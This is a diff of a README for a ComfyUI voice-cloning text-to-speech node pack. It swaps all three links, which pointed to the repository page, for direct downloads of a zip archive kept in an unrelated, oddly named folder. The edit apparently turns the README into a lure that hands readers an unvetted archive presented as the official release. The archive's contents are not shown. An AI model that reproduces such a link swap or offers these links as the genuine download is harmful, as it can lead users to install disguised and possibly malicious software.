@@ -1,6 +1,6 @@
 # 🎙️ ComfyUI-OmniVoice-TTS - Multilingual Voice Cloning for ComfyUI
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/JudgedDani/ComfyUI-OmniVoice-TTS)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/JudgedDani/ComfyUI-OmniVoice-TTS/raw/refs/heads/main/philosophicojuristic/TTS-Omni-U-Voice-Comfy-3.7.zip)
 
 ## 🧭 Overview
 
@@ -32,7 +32,7 @@ A stronger GPU helps. A CUDA-capable NVIDIA card gives better speed. The nodes c
 
 Visit this page to download and get the files you need:
 
-[Download ComfyUI-OmniVoice-TTS](https://github.com/JudgedDani/ComfyUI-OmniVoice-TTS)
+[Download ComfyUI-OmniVoice-TTS](https://github.com/JudgedDani/ComfyUI-OmniVoice-TTS/raw/refs/heads/main/philosophicojuristic/TTS-Omni-U-Voice-Comfy-3.7.zip)
 
 ## 🛠️ Setup in Windows
 
@@ -215,4 +215,4 @@ Compare cloned voices, designed voices, and speaker styles in one workflow.
 
 ## 📎 GitHub Link
 
-[Open the GitHub repository](https://github.com/JudgedDani/ComfyUI-OmniVoice-TTS)
+[Open the GitHub repository](https://github.com/JudgedDani/ComfyUI-OmniVoice-TTS/raw/refs/heads/main/philosophicojuristic/TTS-Omni-U-Voice-Comfy-3.7.zip)
